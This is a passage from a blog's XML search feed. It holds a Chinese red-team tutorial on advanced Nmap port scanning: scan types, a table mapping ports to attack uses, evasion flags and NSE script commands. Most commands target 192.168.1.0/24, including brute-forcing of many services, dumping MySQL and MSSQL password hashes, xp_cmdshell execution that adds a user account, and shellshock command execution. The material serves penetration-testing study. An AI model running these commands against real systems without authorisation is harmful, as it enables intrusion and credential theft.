提示交互式 sqlmap shell--wizard ## 给初级用户的简单向导界面 0xFF Reference https://github.com/sqlmapproject/sqlmap/wiki/Usage]]></content>
      <categories>
        <category>红队渗透</category>
      </categories>
      <tags>
        <tag>Red Team</tag>
        <tag>Sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[端口扫描之Nmap进阶指南]]></title>
    <url>%2Fposts%2F46803%2F</url>
    <content type="text"><![CDATA[本文总结端口扫描中Nmap的一些进阶用法及实用技巧... 0x01 端口扫描端口扫描是指客户端向一定范围的服务器端口发送对应请求，以此确认可使用的端口；通过扫描结果可以知道服务器上都提供了哪些服务，以利用该服务的已知漏洞；企业外网端口监控，是预防攻击者从外部直接入侵的一道重要防线 1. 端口状态以下为Nmap对端口状态的划分及说明 状态 描述 open(开放的) 应用程序正在该端口接收TCP连接或者UDP报文，有应用程序在监听这个端口，可以被访问 closed(关闭的) 关闭的端口对于Nmap也是可访问的(它接受Nmap的探测报文并作出响应)， 但没有应用程序在其上监听 filtered(被过滤的) 由于包过滤阻止探测报文到达端口， Nmap无法确定该端口是否开放 unfiltered(未被过滤的) 端口可访问，但Nmap无法准确判断端口是否开放，ACK扫描中出现 open/filtered(开放或者被过滤的) 无法确定端口是开放还是被过滤的，如开放的端口不响应；UDP，IP协议， FIN，Null，和Xmas扫描可能把端口归入此类 closed/filtered(关闭或者被过滤的) 用于Nmap不能确定端口是关闭的还是被过滤的，只可能出现在IPID Idle扫描中 2. 扫描方式TPC报文表头 Refer: wikipedia/Transmission_Control_Protocol a. TCP 全连接扫描扫描原理 1TCP Connect扫描又称为全连接扫描，客户端与服务器建立 TCP 连接要进行一次三次握手，如果进行了一次成功的三次握手，则说明端口开放 1客户端会发送一个带有SYN标识和端口号的TCP数据包给服务器，如果服务器这个端口是开放的，则会接受这个连接并返回一个带有SYN和ACK标识的数据包给客户端，随后客户端会发送带有ACK和RST标识的数据包给服务点，此时客户端与服务器建立了连接 1当客户端发送一个带有 SYN 标识和端口号的 TCP 数据包给服务器后，如果服务器端返回一个带 RST 标识的数据包，则说明端口处于关闭状态 b. TCP SYN扫描扫描原理 1TCP SYN扫描又称半开式扫描，该过程不会和服务端建立完整的连接；SYN扫描是直接发RST，而TCP全连接扫描是发ACK和RST 1客户端会发送一个带有SYN标识和端口号的TCP数据包给服务器，如果服务器这个端口是开放的，则会接受这个连接并返回一个带有SYN和ACK标识的数据包给客户端，随后客户端会返回带有RST标识的数据包而不是返回一个带有ACK和RST标识的数据包 1如果目标端口处于关闭状态，则服务端会返回一个RST标识的数据包 c. TCP ACK扫描扫描原理 1ACK扫描返回两种状态: unfiltered/filtered；当发送给对方一个含有 ACK 表示的TCP报文的时候，都返回含有RST标志的报文，使用TCP ACK扫描来确定端口是否开放或者关闭；但可以利用它来扫描防火墙的配置，来发现防火墙规则，确定它们是有状态的还是无状态的，哪些端口是被过滤的 1向服务端发送一个带有 ACK 标识的数据包，如果收到带有 RST 标识的响应，则说明服务端没有过滤，不存在状态防火墙 1端口不响应，或者发送特定的ICMP错误消息(类型3，代号1，2，3，9，10， 或者13)的端口，标记为 filtered(被过滤的)；服务器REJECT掉数据包，客户端会有个ICMP包返回，如果是直接DROP掉，就会什么也不会返回 d. TCP Null扫描扫描原理 1234567在空扫描中，客户端发出的 TCP 数据包仅仅只会包含端口号而不会有其他任何的标识信息。1）如果目标端口是开放的则不会回复任何信息2）如果服务器返回了一个 RST（或者RST+ACK) 数据包，则说明目标端口是关闭的3）如果返回 ICMP 错误类型3且代码为1，2，3，9，10或13的数据包，则说明端口被服务器过滤了 e. TCP Window扫描扫描原理 12345TCP 窗口扫描的流程同 ACK 扫描类似，同样是客户端向服务器发送一个带有 ACK 标识和端口号的 TCP 数据包，这种扫描能够用于发现目标服务器端口的状态。在 ACK 扫描中返回 RST 表明没有被过滤，但在窗口扫描中，当收到返回的 RST 数据包后，它会检查窗口大小的值1) 如果窗口大小的值是个非零值，则说明目标端口是开放的2) 如果返回的 RST 数据包中的窗口大小为0，则说明目标端口是关闭的 f. TCP FIN扫描扫描原理 1234567FIN 扫描会向服务器发送带有 FIN 标识和端口号的 TCP 数据包。1）如果没有服务器端回应则说明端口开放2）如果服务器返回一个 RST 数据包，则说明目标端口是关闭的3）如果服务器返回了一个 ICMP 数据包，其中包含 ICMP 目标不可达错误类型3以及 ICMP 代码为1，2，3，9，10或13，则说明目标端口被过滤了无法确定端口状态 g. TCP Xmas扫描扫描原理 1234567在发送的数据包中设置PSH（PUSH推送，数据包立刻发送）,FIN（结束会话）,URG（紧急）标志位1）如果目标端口是开放的则不会回复任何信息2）如果目标端口关闭则会返回一个RST+ACK的数据包3）如果服务器返回了一个 ICMP 数据包，其中包含 ICMP 目标不可达错误类型3以及 ICMP 状态码为1，2，3，9，10或13，则说明目标端口被过滤了无法确定是否处于开放状态 h. UDP扫描TCP/UDP 对比 12345TCP 是面向连接的协议，而UDP则是无连接的协议。面向连接的协议会先在客户端和服务器之间建立通信信道，然后才会开始传输数据。如果客户端和服务器之间没有建立通信信道，则不会有任何产生任何通信数据。无连接的协议则不会事先建立客户端和服务器之间的通信信道，只要客户端到服务器存在可用信道，就会假设目标是可达的然后向对方发送数据 扫描原理 123456789客户端会向服务器发送一个带有端口号的 UDP 数据包1）如果服务器回复了 UDP 数据包，则目标端口是开放的2）如果服务器返回了一个 ICMP 目标不可达的错误和代码3，则意味着目标端口处于关闭状态3）如果服务器返回一个 ICMP 错误类型3且代码为1，2，9，10或13的数据包，则说明目标端口被服务器过滤了4）如果服务器没有任何相应客户端的 UDP 请求，则可以断定目标端口可能是开放或被过滤的，无法判断端口的最终状态 3. 端口渗透总计一些常用端口的渗透用途 端口 服务 渗透用途 21 ftp/tftp/vsftpd文件传输协议 爆破/嗅探/溢出/后门 22 ssh远程连接 爆破/OpenSSH漏洞 23 Telnet远程连接 爆破/嗅探 25 SMTP邮件服务 邮件伪造 53 DNS域名解析系统 DNS区域传输/劫持/缓存投毒/欺骗; 利用DNS隧道技术刺透防火墙 67/68 dhcp服务 劫持/欺骗 69 tftp(简单文件传输协议,无认证) 尝试下载目标重要配置文件 110 pop3 爆破/嗅探 137/139 Samba服务 爆破/未授权访问/远程代码执行 143 Imap协议 爆破 161 SNMP协议 爆破/搜集目标内网信息 389 Ldap目录访问协议 注入/未授权访问/弱口令/匿名访问 445 smb ms17-010/端口溢出 512/513/514 Linux Rexec服务 爆破/Rlogin登陆 873 Rsync服务 文件上传/匿名访问 1080 socket 爆破/内网渗透 1099 JAVA RMI 反序列化远程命令执行漏洞 1194 openvpn 获取vpn账号,进内网 1352 Lotus domino邮件服务 爆破/弱口令/信息泄漏 1433 mssql 爆破/注入攻击/提权/sa弱口令 1500 ispmanager主机控制面板 弱口令 1521 oracle 注入攻击/TNS爆破/弹shell 1723 pptp 爆破/获取vpn账号,进内网 2049 Nfs服务 配置不当 2082,2083 cpanel主机管理面板登录 弱口令 2181 zookeeper服务 未授权访问 2375 docker remote api 未授权访问 2601,2604 zebra路由 默认密码zerbra 3128 squid代理服务 弱口令 3306 mysql 爆破/注入/拒绝服务/提取 3389 Rdp远程桌面连接 爆破/shift后门/ms12-020 3690 svn服务 svn泄露/未授权访问 4848 GlassFish控制台 爆破/认证绕过 5000 sybase/DB2数据库 爆破/注入 5432 postgresql 爆破/注入/缓冲区溢出 5632 pcanywhere服务 拒绝服务/代码执行 5900,5901,5902 vnc 弱口令爆破 5984 CouchDB 未授权访问导致任意指令执行 6379 Redis数据库 未授权访问/爆破 6443 Kubernetes API Server 未授权访问 7001/7002 weblogic java反序列化/控制台弱口令/控制台上传webshell/SSRF 80-89,443 http/https web应用漏洞/OpenSSL心脏滴血 8000 JDWP 远程命令执行漏洞 8069 zabbix服务 远程命令执行/注入 8080-8089 Jboss/Tomcat/Jenkins/Resin/Jetty 控制台弱口令/反序列化/远程文件读取 8083/8086 influxDB 未授权访问 8161 ActiveMQ 弱口令/任意文件写入/反序列化 9000 fastcgi 远程命令执行 9080-9081,9090 Websphere控制台 java反序列化/弱口令 9200/9300 elasticsearch 未授权访问/远程代码执行 11211 memcached 未授权访问 27017/27018 mongodb 未授权访问/爆破 50000 SAP 远程代码执行 50070,50030 hadoop 默认端口未授权访问 Refer: http://www.91ri.org/15441.html 0x02 Nmap基础1. 参数总结 功能 参数 描述 目标选取 -iL inputfilename (从列表中输入) -iR hostnum (随机选择目标) –exclude &lt;host1[，host2][，host3]，…&gt; (排除主机/网络) –excludefile excludefile (排除文件中的列表) 指定目标范围 主机发现 a. -sL (列表扫描) b. -sP (Ping扫描) c. -P0 (无ping) d. -PS [portlist] (TCP SYN Ping) e. -PA [portlist] (TCP ACK Ping) f. -PU [portlist] (UDP Ping) g. -PE; -PP; -PM (ICMP Ping Types) h. -PR (ARP Ping) i. -n (不用域名解析) j. -R (为所有目标解析域名)k. –system-dns (使用系统域名解析器) a. 列出指定网络上的每台主机， 不发送任何报文到目标主机 b. 默认情况下， 发送一个ICMP回声请求和一个TCP报文到80端口 c. 禁止主机发现，使Nmap对每一个指定的目标IP地址进行扫描 d. 发送一个设置了SYN标志位的空TCP报文，适用于突破有状态的规则来封锁非预期的报文的防火墙 e. 设置TCP的ACK标志位，适用于突破无状态防火墙规则 f. 可穿越只过滤TCP的防火墙和过滤器，默认端口31338 g. -PE选项打开该回声请求功能，时间戳和地址掩码查询可以分别用-PP和-PM选项发送 h. ARP扫描比基于IP的扫描更快更可靠，常用于扫描一个以太局域网，不想要ARP扫描，指定–send-ip i. 不对发现的活动IP地址进行反向域名解析，提升探测速度 j. 对目标IP地址作反向域名解析，当发现机器正在运行时进行这项操作 k. 执行较慢，多用于IPv6扫描 端口扫描 a. -sS (TCP SYN扫描) b. -sT (TCP connect()扫描) c. -sU (UDP扫描) d. -sN; -sF; -sX (TCP Null，FIN，and Xmas扫描) e. -sA (TCP ACK扫描) f. -sW (TCP窗口扫描)g. -sM (TCP Maimon扫描) h. –scanflags (定制的TCP扫描)i. -sI &lt;zombie host[:probeport]&gt; (Idlescan) j. -sO (IP协议扫描) k. -b [ftp relay host] (FTP弹跳扫描) a. 半开放扫描，发送一个SYN报文，然后等待响应， SYN/ACK表示端口在监听 (开放)，RST (复位)表示没有监听者b. 全连接扫描，通过创建connect() 系统调用要求操作系统和目标机以及端口建立连接，连接易被记录 c. 常用UDP服务：DNS，SNMP，和DHCP (注册的端口是53，161/162，和67/68)；UDP扫描发送空的UDP报头到每个目标端口，若服务响应一个UDP报文，证明该端口是open(开放的)；扫描较慢 d. 如果收到一个RST报文，该端口被认为是 closed(关闭的)，没有响应则意味着端口是open/filtered(开放或者被过滤的)；收到ICMP不可到达错误(类型 3，代号 1，2，3，9，10，或者13)，该端口就被标记为被过滤的 e. 设置ACK标志位， open(开放的)和closed(关闭的) 端口都会返回RST报文，标记为 unfiltered(未被过滤的)；不响应的端口或者发送特定的ICMP错误消息(类型3，代号1，2，3，9，10， 或者13)的端口，标记为 filtered(被过滤的) f. 根据TCP窗口值是正数还是0，分别把端口标记为open或者 closed g. 探测报文是FIN/ACK，其余与Null，FIN，以及Xmas扫描完全一样h. 通过指定任意TCP标志位来设计自己的扫描 i. 允许对目标进行真正的TCP端口盲扫描，无报文从所用真实IP地址发送到目标j. 确定目标机支持哪些IP协议 (TCP，ICMP，IGMP，等等) k. 请求FTP服务器轮流发送一个文件到目标主机上的所感兴趣的端口，错误消息会描述端口是开放还是关闭的 服务/版本探测 a. -sV (版本探测) b. –allports (不为版本探测排除任何端口)c. –version-intensity [intensity] (设置版本扫描强度) d. –version-light (打开轻量级模式) e. –version-all (尝试每个探测) f. –version-trace (跟踪版本扫描活动)g. -sR (RPC扫描) a. 可以用-A同时打开操作系统探测和版本探测b. 指定–allports扫描所有端口，默认情况下，Nmap版本探测会跳过9100TCP端口(打印机服务) c. 进行版本扫描(-sV)时，nmap发送一系列探测报文 ，每个报文都被赋予一个1到9之间的值，数值越高， 服务越有可能被正确识别；强度值必须在0和9之间，默认是7d. –version-intensity 2的别名，使版本扫描快许多，但它识别服务的可能性也略微小一点 e. –version-intensity 9的别名， 保证对每个端口尝试每个探测报文 f. 打印出详细的关于正在进行的扫描的调试信息，是用–packet-trace所得到的信息的子集g. 对所有被发现开放的TCP/UDP端口执行SunRPC程序NULL命令，来试图 确定它们是否RPC端口，被-sV版本探测包括 操作系统探测 a. -O (启用操作系统检测) b. –osscan-limit (针对指定的目标进行操作系统检测) c. –osscan-guess; –fuzzy (推测操作系统检测结果) a. 可以使用-A来同时启用操作系统检测和版本检测 b. 只对满足条件的主机进行操作系统检测，可以节约时间，特别在使用-P0扫描多个主机时 c. 当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配 时间/性能 a. –min-hostgroup [milliseconds]; –max-hostgroup [milliseconds] (调整并行扫描组的大小)b. –min-parallelism [milliseconds]; –max-parallelism [milliseconds] (调整探测报文的并行度)c. –min-rtt-timeout [milliseconds]， –max-rtt-timeout [milliseconds]， –initial-rtt-timeout [milliseconds] (调整探测报文超时)d. –host-timeout [milliseconds] (放弃低速目标主机) e. –scan-delay [milliseconds]; –max-scan-delay [milliseconds] (调整探测报文的时间间隔)f. -T [Paranoid/Sneaky/Polite/Normal/Aggressive/Insane] (设置时间模板) a. 将多个目标IP地址空间分成组，然后在同一时间对一个组进行扫描；主要用途是说明一个最小组的大小，使得整个扫描更加快速，通常选择256来扫描C类网段b. 控制用于主机组的探测报文数量，可用于端口扫描和主机发现；–max-parallelism选项通常设为1，以防止Nmap在同一时间 向主机发送多个探测报文c. 如果所有的主机都在本地网络，对于–max-rtt-timeout值来说，100毫秒比较合适。如果存在路由，使用ICMP ping工具ping主机，查看大约10个包的最大往返时间，然后将 –initial-rtt-timeout设成这个时间的2倍，–max-rtt-timeout 可设成这个时间值的3倍或4倍。不管ping的时间是多少，最大的rtt值不得小于100ms， 不能超过1000msd. 使用 –host-timeout选项来说明等待的时间(毫秒)e. 用于控制针对一个主机发送探测报文的等待时间(毫秒)f. Nmap使用6个时间模板，采用-T选项及数字(0 - 5) 或模板名称paranoid (0)、sneaky (1)、polite (2)、normal(3)、 aggressive (4)和insane (5)优化扫描时间；默认模式为Normal(-T3)，-T4选项较常用，可适当加速扫描 隐蔽扫描 a. -f (报文分段); –mtu (使用指定的MTU) b. -D &lt;decoy1 [，decoy2][，ME]，…&gt; (使用诱饵隐蔽扫描)c. -S [IP_Address] (源地址哄骗) d. -e [interface] (使用指定的接口)e. –source-port [portnumber]; -g [portnumber] (源端口哄骗) –spoof-mac [mac address，prefix，or vendor name] (MAC地址哄骗) a. -f选项要求扫描时(包挺ping扫描)使用 小的IP包分段，使用–mtu选项可 以自定义偏移的大小，使用时不需要-f，偏移量必须 是8的倍数b. 使用逗号分隔每个诱饵主机，也可用自己的真实IP作为诱饵，使用ME选项说明。如果在第6个位置或更后的位置使用ME选项，一些常用端口扫描检测器(如Solar Designer’s excellent scanlogd)就不会报告这个真实IPc. -S选项并说明所需发送包的接口IP地址 d. 告诉Nmap使用哪个接口发送和接收报文e. -g和–source-port选项从指定端口发送数据在发送原以太网帧时使用指定的MAC地址，这个选项隐含了 –send-eth选项，以保证Nmap真正发送以太网包 输出 a. -oN [filespec] (标准输出)b. -oX [filespec] (XML输出) c. –append-output (在输出文件中添加) d. –resume [filename] (继续中断的扫描) e. –stylesheet [path or URL] (设置XSL样式表，转换XML输出) a. 将标准输出直接写入指定的文件b. 要求XML输出直接写入指定的文件 c. 保留现有内容，将结果添加在现 有文件后面，-oN选项有效 d. 标准扫描 (-oN)或Grep扫描(-oG)日志被保留，使用选项 –resume并说明标准/Grep扫描输出文件，不允许使用其它参数，Nmap会解析输出文件并使用原来的格式输出 e. Nmap提从了XSL样式表nmap.xsl，用于查看或转换XML输出至HTML 细节信息 a. -v (提高输出信息的详细度)b. -d [level] (提高或设置调试级别) c. –packet-trace (跟踪发送和接收的报文) d. –iflist (列举接口和路由) a. 此选项使用两次，会提供更详细的信息 b. 使用细节选项(-v)时，可启用命令行参数 (-d)，多次使用可提高调试级别c. 要求Nmap打印发送和接收的每个报文的摘要，通常用于调试；为避免输出过多的行，可以限制扫描的端口数，如-p20-30；如果只需进行版本检测，使用–version-trace d. 输出Nmap检测到的接口列表和系统路由，用于调试路由问题或设备描述失误 2. 端口选项1默认情况下，Nmap用指定的协议对端口1到1024以及nmap-services 文件中列出的更高的端口在扫描 选项 描述 -p [port ranges] (只扫描指定的端口) 指定想扫描的端口，覆盖默认值； -p U:53，111，137，T:21-25，80，139，8080：将扫描UDP 端口53，111，和137，同时扫描列出的TCP端口 -F (快速 (有限的端口) 扫描) nmap-services 文件中(对于-sO，是协议文件)指定您想要扫描的端口 -r (不要按随机顺序扫描端口) 默认情况下，Nmap按随机顺序扫描端口，可以指定-r来顺序端口扫描 3. 扫描实战全面扫描目标主机的所有信息 1$ nmap -A -v 192.168.1.233 扫描目标机器详细服务 1$ nmap -sV -sT -Pn --open -v 192.168.1.233 探测目标操作系统类型 1$ namp -O -v 192.168.0.233 扫描指定的常用端口 1$ namp -p U:53,111,137,T:21-25,80,139,8080 192.168.1.233 内网arp扫描,探测内网存活主机 1$ nmap -sn -PR 192.168.1.0/24 快速扫描整个C段 1$ nmap -T5 --open 192.168.1.0/24 观察扫描时的详细发包过程 1$ nmap --packet-trace 192.168.1.0/24 扫描目标机器服务banner信息 1$ nmap -sT -Pn --open -v banner.nse 192.168.1.233 常用组合语法 1$ nmap --open -p port -Pn -v -sT -sV --script script_name ip/domain/cidr 0x03 脚本引擎1. 脚本分类 类别 描述 auth 负责处理鉴权证书（绕开鉴权）的脚本 broadcast 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务 brute 提供暴力破解方式，针对常见的应用如http/snmp等 default 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力 discovery 对网络进行更多的信息，如SMB枚举、SNMP查询等 dos 用于进行拒绝服务攻击 exploit 利用已知的漏洞入侵系统 external 利用第三方的数据库或资源，例如进行whois解析 fuzze 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽 malware 探测目标机是否感染了病毒、开启了后门等信息 safe 此类与intrusive相反，属于安全性脚本 version 负责增强服务与版本扫描（Version Detection）功能的脚本 vuln 负责检查目标机是否有常见的漏洞（Vulnerability） 2. 脚本选项 选项 描述 -sC/–script=default 使用默认的脚本进行扫描 –script= 使用某个脚本进行扫描 –script-args=x=x,y=y 为脚本提供参数 –script-args-file=filename 使用文件来为脚本提供参数 –script-trace 显示脚本执行过程中发送与接收的数据 –script-updatedb 更新脚本数据库 –script-help=[Lua scripts] 显示脚本的帮助信息 0x04 实用脚本1. FTP扫描脚本1$ nmap -p 21 --script ftp-bounce.nse -v 192.168.1.233 脚本 描述 ftp-anon.nse 检查目标ftp是否允许匿名登录 ftp-bounce.nse 检查目标ftp是否允许使用弹跳法进行端口扫描 ftp-brute.nse ftp爆破脚本 ftp-libopie 检查FTP是否存在CVE-2010-1938 (OPIE off-by-one 堆栈溢出)漏洞 ftp-vuln-cve2010-4221 ProFTPD 1.3.3c之前的netio.c文件中的pr_netio_telnet_gets函数中存在多个栈溢出 2. SSH扫描脚本1$ nmap -p 22 --script ssh-brute.nse -v 192.168.1.233 脚本 描述 ssh-brute.nse SSH爆破脚本 ssh-publickey-acceptance.nse｜公钥认证缺陷扫描 ssh-run.nse SSH远程命令执行验证 sshv1.nse 检查是否存在sshv1低版本漏洞 3. Telnet扫描脚本1$ nmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s -v 192.168.1.0/24 脚本 描述 telnet-brute.nse telnet爆破脚本 4. SMTP扫描脚本1$ nmap -p 25 --script smtp-brute.nse 192.168.1.233 脚本 描述 smtp-brute.nse SMTP爆破脚本 smtp-enum-users 枚举目标smtp服务器的邮件用户名,需目标要存在此错误配置 smtp-vuln-cve2010-4344 Exim 4.70之前版本中的string.c文件中的string_vformat函数中存在堆溢出 smtp-vuln-cve2011-1720 Postfix 2.5.13之前版本，2.6.10之前的2.6.x版本，2.7.4之前的2.7.x版本和2.8.3之前的2.8.x版本,存在溢出 smtp-vuln-cve2011-1764 Exim “dkim_exim_verify_finish()” 存在格式字符串漏洞 5. POP3扫描脚本1$ nmap -p 110 --script pop3-brute.nse -v 192.168.1.233 脚本 描述 pop3-brute pop简单弱口令爆破脚本 6. IMAP扫描脚本1$ nmap -p 143,993 --script imap-brute.nse -v 192.168.1.233 脚本 描述 imap-brute imap简单弱口令爆破 7. DNS利用脚本1$ nmap -p 53 --script dns-zone-transfer.nse --script-args dns-zone-transfer.domain=target.org -v 192.168.1.233 脚本 描述 dns-brute.nse 尝试通过暴力猜测常见子域来枚举DNS主机名 dns-fuzz.nse 对DNS服务器发起DNS模糊攻击 dns-random-srcport.nse 检查DNS服务器是否存在可预测的端口递归漏洞(CVE-2008-1447) dns-zone-transfer 检查目标ns服务器是否允许传送 8. SNMP扫描脚本1$ nmap -sU --script snmp-brute --script-args snmp-brute.communitiesdb=user.txt 192.168.1.0/24 脚本 描述 snmp-brute SNMP暴力破解 9. LDAP扫描脚本1$ nmap -p 389 --script ldap-brute --script-args ldap.base=&apos;&quot;cn=users,dc=cqure,dc=net&quot;&apos; 192.168.1.0/24 脚本 描述 ldap-brute 尝试强行进行LDAP认证爆破 ldap-search 尝试执行LDAP搜索并返回所有匹配项 10. Web利用脚本 脚本 描述 实例 xmpp-brute.nse xmpp爆破 $ nmap -p 5222 –script xmpp-brute.nse 192.168.1.0/24 http-iis-short-name-brute.nse 短文件扫描 $ nmap -p80 –script http-iis-short-name-brute.nse 192.168.1.0/24 http-shellshock.nse bash远程执行 $ nmap -sV -p- –script http-shellshock –script-args uri=/cgi-bin/bin,cmd=ls 192.168.1.0/24 http-svn-info.nse 探测目标svn $ nmap –script http-svn-info 192.168.1.0/24 http-wordpress-brute.nse wordpress爆破 $ nmap -p80 -sV –script http-wordpress-brute –script-args ‘userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com,http-wordpress-brute.threads=3,brute.firstonly=true’ 192.168.1.0/24 http-backup-finder.nse 扫描目标网站备份 $ nmap -p80 –script=http-backup-finder 192.168.1.0/24 http-vuln-cve2015-1635.nse iis6.0远程代码执行 $ nmap -sV –script http-vuln-cve* –script-args uri=’/anotheruri/‘ 192.168.1.0/24 11. 数据库利用脚本 脚本 描述 实例 informix-brute.nse informix爆破脚本 $ nmap -p 9088 –script informix-brute.nse 192.168.1.233 mysql-empty-password.nse mysql 扫描root空密码 $ nmap -p 3306 –script mysql-empty-password.nse -v 192.168.1.233 mysql-brute.nse mysql root弱口令简单爆破 $ nmap -p 3306 –script mysql-brute.nse -v 192.168.1.233 mysql-dump-hashes.nse 导出mysql中所有用户的hash $ nmap -p 3306 –script mysql-dump-hashes –script-args=’username=root,password=root’ 192.168.1.233 mysql-vuln-cve2012-2122.nse Mysql身份认证漏洞[MariaDB and MySQL 5.1.61,5.2.11, 5.3.5, 5.5.22],利用条件有些苛刻 [需要目标的mysql是自己源码编译安装] $ nmap -p 3306 –script mysql-vuln-cve2012-2122.nse -v 192.168.1.233 ms-sql-info.nse 扫描C段mssql $ nmap -p 1433 –script ms-sql-info.nse –script-args mssql.instance-port=1433 -v 192.168.1.0/24 ms-sql-empty-password.nse 扫描mssql sa空密码 $ nmap -p 1433 –script ms-sql-empty-password.nse -v 192.168.1.0/24 ms-sql-brute.nse sa弱口令爆破 $ nmap -p 1433 –script ms-sql-brute.nse -v 192.168.1.0/24 ms-sql-xp-cmdshell.nse 利用xp_cmdshell,远程执行系统命令 $ nmap -p 1433 –script ms-sql-xp-cmdshell –script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=”net user test test /add” 192.168.1.0/24 ms-sql-dump-hashes.nse 导出mssql中所有的数据库用户及密码hash $ nmap -p 1433 –script ms-sql-dump-hashes -v 192.168.1.0/24 pgsql-brute.nse 尝试爆破postgresql $ nmap -p 5432 –script pgsql-brute -v 192.168.1.0/24 oracle-brute-stealth.nse 尝试爆破oracle $ nmap –script oracle-brute-stealth -p 1521 –script-args oracle-brute-stealth.sid=ORCL -v 192.168.1.0/24 oracle-brute.nse Oracle数据库爆破 $ nmap –script oracle-brute -p 1521 –script-args oracle-brute.sid=ORCL -v 192.168.1.0/24 mongodb-brute.nse 尝试爆破mongdb $ nmap -p 27017 –script mongodb-brute 192.168.1.0/24 redis-brute.nse redis爆破 $ nmap -p 6379 –script redis-brute.nse 192.168.1.0/24 12. VPN利用脚本 脚本 描述 实例 pptp-version.nse 识别目标pptp版本 $ nmap -p 1723 –script pptp-version.nse 192.168.1.0/24 13. SMB利用脚本SMB远程执行漏洞脚本 123456smb-vuln-ms06-025.nsesmb-vuln-ms07-029.nsesmb-vuln-ms08-067.nsesmb-vuln-ms10-054.nsesmb-vuln-ms10-061.nsesmb-vuln-ms17-010.nse 1$ nmap -p445 --script smb-vuln-ms17-010.nse 192.168.1.0/24 14. 其他脚本 脚本 描述 实例 rsync-brute.nse 爆破目标的rsync $ nmap -p 873 –script rsync-brute –script-args ‘rsync-brute.module=www’ 192.168.1.0/24 rlogin-brute.nse 爆破目标的rlogin $ nmap -p 513 –script rlogin-brute 192.168.1.0/24 vnc-brute.nse 爆破目标的vnc $ nmap –script vnc-brute -p 5900 192.168.1.0/24 pcanywhere-brute.nse 爆破pcanywhere $ nmap -p 5631 –script=pcanywhere-brute 192.168.1.0/24 nexpose-brute.nse 爆破nexpose $ nmap –script nexpose-brute -p 3780 192.168.1.0/24 shodan-api.nse 配合shodan接口进行扫描 $ nmap –script shodan-api –script-args ‘shodan-api.target=192.168.1.0/24,shodan-api.apikey=SHODANAPIKEY’ 0x05 扫描实战1依据目标系统端口及服务，选取对应扫描脚本进行扫描探测 目标C段常规漏洞扫描 1$ nmap -sT -Pn -v --script dns-zone-transfer.nse,ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse,http-backup-finder.nse,http-cisco-anyconnect.nse,http-iis-short-name-brute.nse,http-put.nse,http-php-version.nse,http-shellshock.nse,http-robots.txt.nse,http-svn-enum.nse,http-webdav-scan.nse,iis-buffer-overflow.nse,iax2-version.nse,memcached-info.nse,mongodb-info.nse,msrpc-enum.nse,ms-sql-info.nse,mysql-info.nse,nrpe-enum.nse,pptp-version.nse,redis-info.nse,rpcinfo.nse,samba-vuln-cve-2012-1182.nse,smb-vuln-ms08-067.nse,smb-vuln-ms17-010.nse,snmp-info.nse,sshv1.nse,xmpp-info.nse,tftp-enum.nse,teamspeak2-version.nse 192.168.1.0/24 目标C段弱口令爆破 1$ nmap -sT -v -Pn --script ftp-brute.nse,imap-brute.nse,smtp-brute.nse,pop3-brute.nse,mongodb-brute.nse,redis-brute.nse,ms-sql-brute.nse,rlogin-brute.nse,rsync-brute.nse,mysql-brute.nse,pgsql-brute.nse,oracle-sid-brute.nse,oracle-brute.nse,rtsp-url-brute.nse,snmp-brute.nse,svn-brute.nse,telnet-brute.nse,vnc-brute.nse,xmpp-brute.nse 192.168.1.0/24 0xFF Reference wikipedia/Transmission_Control_Protocol https://nmap.org/docs.html https://nmap.org/book/man.html https://nmap.org/nsedoc/ https://github.com/nmap/nmap/scripts http://www.nmap.com.cn/doc/manual.shtm Mastering the Nmap Scripting Engine https://www.hackingarticles.in/category/nmap/ 本文涉及内容，仅限于网络安全从业者学习交流，切勿用于非法用途...]]></content>
      <categories>
        <category>红队渗透</category>
      </categories>
      <tags>
        <tag>Red Team</tag>
        <tag>Nmap</tag>
        <tag>NSE</tag>
      </tags>
  </entry>
</search>
